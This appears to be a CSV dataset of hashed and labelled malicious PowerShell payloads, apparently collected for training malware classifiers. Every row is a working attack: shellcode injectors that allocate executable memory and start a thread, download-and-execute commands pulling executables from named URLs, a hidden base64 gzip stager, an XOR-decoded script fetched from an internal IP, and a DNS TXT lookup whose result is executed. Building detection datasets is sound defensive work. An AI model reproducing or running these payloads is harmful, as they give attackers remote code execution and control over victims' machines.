SHA256,Full Payload,Label
e87fff8811c9ecef1274c770e5bbf5dd1c9d99a56ea9f76e39cc90311d71be02,"
$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$sc = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x02,0x7b,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$size = 0x1000;if ($sc.Length -gt 0x1000){$size = $sc.Length};$x=$w::VirtualAlloc(0,0x1000,$size,0x40);for ($i=0;$i -le ($sc.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

",Payload
30a5d1443d7e3e1e4f15af2900ccf25d5631d5475f52a33c93df91076a0e8264,"
(New-Object System.Net.WebClient).DownloadFile('https://a.pomf.cat/vhcwbo.exe',""$env:TEMP\\winrex.exe"");Start-Process (""$env:TEMP\\winrex.exe"")

",Payload
fc04cb621163954fa0f60dfaec9b07b3c9c6a20600609940d59c8a3ef1684e87,"
(New-Object System.Net.WebClient).DownloadFile('http://worldnit.com/aba.exe','fleeble.exe');Start-Process 'fleeble.exe'

",Payload
46a454f5dbcdbac5a259b59d9c23aa3726f21be0a803e049ebfaf8f950f31ad4,"
$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x01,0x8e,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

",Payload
b7c31b2b0c90d6ff905c0187262ef34db9a745db4a5417d7e421ce58b14354f4,"
if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\\syswow64\\WindowsPowerShell\\v1.0\\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-nop -w hidden -c $s=New-Object IO.MemoryStream(,[Convert]::FromBase64String(''H4sIAGImx1cCA7VWbW/aSBD+nEr9D1aFZFt1MBDSNJEq3RpwILwEcDABik4be20WFi+x1+Gl7X+/MdgpUdNe705ngby787KzzzyzYy8OHEF5IG0cMmwy6cvbNyddHOKlpOScxmI8mBVLmpR79NYb9eQEhDlWOj9n9bOHLTNm0idJmaDVqsqXmAbTq6tKHIYkEId5/poIFEVk+cAoiRRV+ioNZyQkp7cPc+II6YuU+zN/zfgDZqnatoKdGZFOUeAmshZ3cBJc3loxKhT582dZnZwWp/naY4xZpMjWNhJkmXcZk1Xpm5pseLddEUVuUyfkEfdEfkiDs1J+EETYIx3w9kTaRMy4G8kqnAZ+IRFxGEgvzpU4OqgpMgy7IXeQ64YkAqt8I3jiC6LkgpgxTfpDmaRR9ONA0CUBuSAhX1kkfKIOifJ1HLiM9Ik3VTpknR3+d42UYyPQ6opQ1SA5vwi3zd2YkYMHWf0x4OfEqvBkyQU0vr198/aNlxEibBaP2QCjk8l+TCBSpcsjulf7JBU0qQ17YcHDLUxzd2FM1Kk0STIxmU7Bv4Pa0WU4D7SfOylmFqAf9YsXDukO+pYLkonNqTsFyzRfOWFvzM4c+wucSH/OvirxaECq2wAvqZMRTHktB8RjZH/ofKbWgQgVORUQt0oY8bFI0NSkyY9mtSUVz7ZGTJlLQuRAHiOIClKsvgzmkCBFbgRtsgTUDnMZUuEBrUmmnVJ5m+2ezEFJrjAcRZrUjaGuHE2yCGbE1SQURDQVoVjw/VD+Hm47ZoI6OBKZu6n6Es101woPIhHGDqQTELizVsShmCWAaFKdusTYWtTPdpdfhaOCGaOBD56eIB2wksBgiYQkoasdEULNW0Q0litGlqC4r3WTYR8qO62LPbWwT1z59WAz1h8onoCToXIUKmTcYlxokk1DARdHAvQRx/5DQEfXx1FolZCk2VKyqpoYW5EUQ050UX/XKY8T6qbA7WEKBUBkhnxp4Ih8KFsiBACVd/otrSB4Ro2AtR1jQYtoTYuNNvwH9KzBqxdu82Ze18PqZuahRtRo17vVXr1efrqx7LKwag3R7DZEu3Y/n1uo3h+MxLiB6ne0sBiVd6sburNayB1t9A87Y7cuGJvd3He9UdXz/AvP6hfPTdoaVnpGoYRb1VrcGhpro1COanRd79FBb3FjioeRzfDA0/374iWmm1Y4t4u8vWsgdD07c3Y3nn09a7vbUV2/HJYXqIZQJajZpsGbIyNEXd3Gvs3XTd+oDP0KMkyHknFvYBq9nmmgwfX8sXqp+2B7j2fG0C7R8eq+P4O5CSE09UK54ZIdH/UApGuOsN8HHb9ScmYe6FTfI+N9h0clvDA4MkDHHD9CXKOV2WUgvxuUOLJZ5x6j1nhr6npx1C2jeoEOr32UuMS+0cMoeqruqnrRdrk7PO+MPN2+Zxd6tXK3cjxd19f1atMZFzcfby8+tobUXnI00HX7XcIQoEhuXbxdHeX7Z1d+G4fRDDPgAdzhWZGaPDTTG7nLaWKhKGmrXpAwIAyaG7S/jNqIMe4k/SG5vaE1HRrGFKp0AMOz0qsjVXpWVL+3i2zp6moMYUKRZNTNt0jgi5lW2JwVCnD5FzblAhz1949X4aut8uxOSxrIHqPjPdh+DzWpnRwTj0Oza/n/N4Zp3c7g5f4Nht/XfiH9LVwL2uHsPyy/XPhHAP+Lsw8xFaBrwa3DyKE9vgpBypijr4osO8AHL32SL73bWJx24IPjL80j3eZhCgAA''));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);

",Payload
090e0f85d1ed5f677f5be0c2ef2aa359586ec65ef9dbd9def88c7c10b92367ed,"
$giSg = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $giSg -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xb8,0x93,0x9a,0x11,0xd2,0xd9,0xea,0xd9,0x74,0x24,0xf4,0x5b,0x31,0xc9,0xb1,0x47,0x31,0x43,0x13,0x03,0x43,0x13,0x83,0xeb,0x6f,0x78,0xe4,0x2e,0x67,0xff,0x07,0xcf,0x77,0x60,0x81,0x2a,0x46,0xa0,0xf5,0x3f,0xf8,0x10,0x7d,0x6d,0xf4,0xdb,0xd3,0x86,0x8f,0xae,0xfb,0xa9,0x38,0x04,0xda,0x84,0xb9,0x35,0x1e,0x86,0x39,0x44,0x73,0x68,0x00,0x87,0x86,0x69,0x45,0xfa,0x6b,0x3b,0x1e,0x70,0xd9,0xac,0x2b,0xcc,0xe2,0x47,0x67,0xc0,0x62,0xbb,0x3f,0xe3,0x43,0x6a,0x34,0xba,0x43,0x8c,0x99,0xb6,0xcd,0x96,0xfe,0xf3,0x84,0x2d,0x34,0x8f,0x16,0xe4,0x05,0x70,0xb4,0xc9,0xaa,0x83,0xc4,0x0e,0x0c,0x7c,0xb3,0x66,0x6f,0x01,0xc4,0xbc,0x12,0xdd,0x41,0x27,0xb4,0x96,0xf2,0x83,0x45,0x7a,0x64,0x47,0x49,0x37,0xe2,0x0f,0x4d,0xc6,0x27,0x24,0x69,0x43,0xc6,0xeb,0xf8,0x17,0xed,0x2f,0xa1,0xcc,0x8c,0x76,0x0f,0xa2,0xb1,0x69,0xf0,0x1b,0x14,0xe1,0x1c,0x4f,0x25,0xa8,0x48,0xbc,0x04,0x53,0x88,0xaa,0x1f,0x20,0xba,0x75,0xb4,0xae,0xf6,0xfe,0x12,0x28,0xf9,0xd4,0xe3,0xa6,0x04,0xd7,0x13,0xee,0xc2,0x83,0x43,0x98,0xe3,0xab,0x0f,0x58,0x0c,0x7e,0xa5,0x5d,0x9a,0x41,0x92,0x5f,0x5d,0x2a,0xe1,0x5f,0x70,0xf6,0x6c,0xb9,0x22,0x56,0x3f,0x16,0x82,0x06,0xff,0xc6,0x6a,0x4d,0xf0,0x39,0x8a,0x6e,0xda,0x51,0x20,0x81,0xb3,0x0a,0xdc,0x38,0x9e,0xc1,0x7d,0xc4,0x34,0xac,0xbd,0x4e,0xbb,0x50,0x73,0xa7,0xb6,0x42,0xe3,0x47,0x8d,0x39,0xa5,0x58,0x3b,0x57,0x49,0xcd,0xc0,0xfe,0x1e,0x79,0xcb,0x27,0x68,0x26,0x34,0x02,0xe3,0xef,0xa0,0xed,0x9b,0x0f,0x25,0xee,0x5b,0x46,0x2f,0xee,0x33,0x3e,0x0b,0xbd,0x26,0x41,0x86,0xd1,0xfb,0xd4,0x29,0x80,0xa8,0x7f,0x42,0x2e,0x97,0x48,0xcd,0xd1,0xf2,0x48,0x31,0x04,0x3a,0x3f,0x5b,0x94;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$lcRX=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($lcRX.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$lcRX,0,0,0);for (;;){Start-sleep 60};

",Payload
73c3c03fe6bbceaa61262b3ff851f6f0be18f1b4fabd05213cac1c3347a9e230,"
$Wc=NEw-OBJeCt SysteM.NEt.WEBCLieNT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$Wc.HEadErS.ADD('User-Agent',$u);$Wc.ProxY = [SYSTEM.NET.WebREQUEsT]::DEfAULTWeBPROXy;$WC.ProXy.CredenTiaLs = [SystEm.NET.CRedEntIALCAChe]::DEfAUltNETWORkCREdenTialS;$K='c51ce410c124a10e0db5e4b97fc2af39';$I=0;[CHaR[]]$b=([cHaR[]]($Wc.DoWnLOADStriNG(""http://192.168.8.60:4444/index.asp"")))|%{$_-bXOr$k[$I++%$k.LEnGTh]};IEX ($B-joIN'')

",Payload
96d6a9c601102cb92802dfc3f8774cdc26fd778e1968de2eca6d0a4d2a873b4e,"
if(''+(nslookup -q=txt p.s.os.ns.rankingplac.pl) -match '@(.*)@'){iex $matches[1]}

",Payload
15ff746194c5f03b5e26a9abbe6bbe942b046a61cae75534967b10592a87fe59,"
$NlG = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $NlG -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xda,0xc4,0xd9,0x74,0x24,0xf4,0x5e,0x31,0xc9,0xbb,0x81,0x80,0xda,0x2b,0xb1,0x47,0x31,0x5e,0x18,0x83,0xee,0xfc,0x03,0x5e,0x95,0x62,0x2f,0xd7,0x7d,0xe0,0xd0,0x28,0x7d,0x85,0x59,0xcd,0x4c,0x85,0x3e,0x85,0xfe,0x35,0x34,0xcb,0xf2,0xbe,0x18,0xf8,0x81,0xb3,0xb4,0x0f,0x22,0x79,0xe3,0x3e,0xb3,0xd2,0xd7,0x21,0x37,0x29,0x04,0x82,0x06,0xe2,0x59,0xc3,0x4f,0x1f,0x93,0x91,0x18,0x6b,0x06,0x06,0x2d,0x21,0x9b,0xad,0x7d,0xa7,0x9b,0x52,0x35,0xc6,0x8a,0xc4,0x4e,0x91,0x0c,0xe6,0x83,0xa9,0x04,0xf0,0xc0,0x94,0xdf,0x8b,0x32,0x62,0xde,0x5d,0x0b,0x8b,0x4d,0xa0,0xa4,0x7e,0x8f,0xe4,0x02,0x61,0xfa,0x1c,0x71,0x1c,0xfd,0xda,0x08,0xfa,0x88,0xf8,0xaa,0x89,0x2b,0x25,0x4b,0x5d,0xad,0xae,0x47,0x2a,0xb9,0xe9,0x4b,0xad,0x6e,0x82,0x77,0x26,0x91,0x45,0xfe,0x7c,0xb6,0x41,0x5b,0x26,0xd7,0xd0,0x01,0x89,0xe8,0x03,0xea,0x76,0x4d,0x4f,0x06,0x62,0xfc,0x12,0x4e,0x47,0xcd,0xac,0x8e,0xcf,0x46,0xde,0xbc,0x50,0xfd,0x48,0x8c,0x19,0xdb,0x8f,0xf3,0x33,0x9b,0x00,0x0a,0xbc,0xdc,0x09,0xc8,0xe8,0x8c,0x21,0xf9,0x90,0x46,0xb2,0x06,0x45,0xf2,0xb7,0x90,0xd5,0x07,0xb4,0xef,0x72,0x0a,0xc4,0xed,0xae,0x83,0x22,0xa1,0xfe,0xc3,0xfa,0x01,0xaf,0xa3,0xaa,0xe9,0xa5,0x2b,0x94,0x09,0xc6,0xe1,0xbd,0xa3,0x29,0x5c,0x95,0x5b,0xd3,0xc5,0x6d,0xfa,0x1c,0xd0,0x0b,0x3c,0x96,0xd7,0xec,0xf2,0x5f,0x9d,0xfe,0x62,0x90,0xe8,0x5d,0x24,0xaf,0xc6,0xc8,0xc8,0x25,0xed,0x5a,0x9f,0xd1,0xef,0xbb,0xd7,0x7d,0x0f,0xee,0x6c,0xb7,0x85,0x51,0x1a,0xb8,0x49,0x52,0xda,0xee,0x03,0x52,0xb2,0x56,0x70,0x01,0xa7,0x98,0xad,0x35,0x74,0x0d,0x4e,0x6c,0x29,0x86,0x26,0x92,0x14,0xe0,0xe8,0x6d,0x73,0xf0,0xd5,0xbb,0xbd,0x86,0x37,0x78;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$jcEK=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($jcEK.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$jcEK,0,0,0);for (;;){Start-sleep 60};

",Payload
f857e9c3e88a67ae68600510a3b32bf70c5b2e8d17fd4717d608f177da435cf4,"
$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xbd,0x0c,0x02,0x66,0x5d,0xd9,0xc8,0xd9,0x74,0x24,0xf4,0x5a,0x29,0xc9,0xb1,0x51,0x31,0x6a,0x13,0x83,0xea,0xfc,0x03,0x6a,0x03,0xe0,0x93,0xa1,0xf3,0x66,0x5b,0x5a,0x03,0x07,0xd5,0xbf,0x32,0x07,0x81,0xb4,0x64,0xb7,0xc1,0x99,0x88,0x3c,0x87,0x09,0x1b,0x30,0x00,0x3d,0xac,0xff,0x76,0x70,0x2d,0x53,0x4a,0x13,0xad,0xae,0x9f,0xf3,0x8c,0x60,0xd2,0xf2,0xc9,0x9d,0x1f,0xa6,0x82,0xea,0xb2,0x57,0xa7,0xa7,0x0e,0xd3,0xfb,0x26,0x17,0x00,0x4b,0x48,0x36,0x97,0xc0,0x13,0x98,0x19,0x05,0x28,0x91,0x01,0x4a,0x15,0x6b,0xb9,0xb8,0xe1,0x6a,0x6b,0xf1,0x0a,0xc0,0x52,0x3e,0xf9,0x18,0x92,0xf8,0xe2,0x6e,0xea,0xfb,0x9f,0x68,0x29,0x86,0x7b,0xfc,0xaa,0x20,0x0f,0xa6,0x16,0xd1,0xdc,0x31,0xdc,0xdd,0xa9,0x36,0xba,0xc1,0x2c,0x9a,0xb0,0xfd,0xa5,0x1d,0x17,0x74,0xfd,0x39,0xb3,0xdd,0xa5,0x20,0xe2,0xbb,0x08,0x5c,0xf4,0x64,0xf4,0xf8,0x7e,0x88,0xe1,0x70,0xdd,0xc4,0x9b,0xef,0xaa,0x14,0x0c,0x87,0x3b,0x7a,0xa5,0x33,0xd4,0xce,0x42,0x9a,0x23,0x31,0x79,0xd3,0xf0,0x9e,0xd1,0x47,0x54,0x73,0xbe,0x5d,0x0c,0x0a,0x99,0x5d,0x65,0xbf,0xb6,0xcb,0x85,0x6c,0x6a,0x64,0x53,0x96,0x8c,0x74,0x8b,0xee,0x8c,0x74,0x4b,0x21,0xb8,0x41,0x08,0x7e,0xae,0xa9,0xde,0xe8,0x79,0x23,0x41,0x2e,0x7a,0xe6,0xf7,0x68,0xd6,0x61,0x08,0x76,0xb9,0xf5,0x5b,0x25,0x6a,0xa1,0x08,0x9f,0xe4,0xa6,0xfa,0x31,0xce,0xc7,0xd0,0xdb,0x5a,0x32,0x84,0xb0,0xc9,0x11,0x69,0x60,0x86,0xb8,0x8b,0x94,0x2d,0x3c,0x46,0x21,0x11,0xb7,0x63,0x66,0xe7,0xd5,0x1c,0x88,0xb2,0x84,0x8b,0x97,0x68,0xa2,0x73,0x0f,0x93,0x23,0x74,0xcf,0xfb,0x43,0x74,0x8f,0xfb,0x10,0x1c,0x57,0x58,0xc5,0x39,0x98,0x75,0x79,0x92,0x35,0xff,0x99,0x42,0xd1,0xff,0x45,0x6d,0x21,0x53,0xd0,0x05,0x33,0xc5,0x55,0x37,0xcc,0x3c,0xe0,0x78,0x46,0x72,0x60,0x7f,0xa7,0x4f,0xf2,0x40,0xd2,0xaa,0xa5,0x83,0x43,0xdd,0xdf,0xfb,0x84,0xe2,0xd1,0x31,0x4d,0x33,0x22,0x18,0x81,0x65,0x73,0x64;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

",Payload
